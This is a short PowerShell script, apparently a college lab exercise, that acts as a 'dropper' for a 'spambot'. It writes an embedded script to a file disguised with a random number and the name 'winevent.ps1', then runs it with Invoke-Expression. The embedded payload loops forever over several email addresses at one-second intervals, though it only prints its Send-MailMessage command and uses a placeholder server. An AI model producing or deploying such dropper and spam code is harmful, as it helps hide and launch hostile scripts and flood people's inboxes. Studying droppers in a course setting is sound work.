<#Storyline: Dropper for spambot that will save to a directory
and then executes it #>

$writeSbBot = @'


#Send an email using Powershell

#Creates an array that can send emails to multiple addresses
$toSend = @('email@champlain.edu', 'stor@champlain.edu', 'duns@champlain.edu')

#Message body
$msg = "To include git information in your prompt, posh-git needs to be imported. To do this automatically, include the import statement into you profile script. This script is executed everytime you open a new PowerShell prompt. Keep in mind, that there are multiple profile scripts. E. g. one for the console and a separate one for the ISE."

while ($true) {
    foreach ($email in $toSend) {

#Send the email
        Write-Host "Send-MailMessage -from 'email@champlain.edu' -To 'email@champlain.edu' -Subject 'Tisk Tisk' `
        -Body $msg -SmtpServer X.X.X.X"

        #Pause for 1 second
        start-sleep 1
    }
}
'@


$sbDir = 'C:\Users\benhacked.EMUL\Desktop\SYS-320-SP22\'

#Create a random number to add to the file
$sbRand = Get-random -Minimum 1000 -Maximum 1999

#Create the file and location to save host
#C:\Desktop\SYS_320_SP22\1045winevent.ps1
$file = $sbDir + $sbRand + "winevent.ps1"

#write to a file
$writeSbBot | out-file -Filepath $file

#Executes Powershell Script
Invoke-Expression $file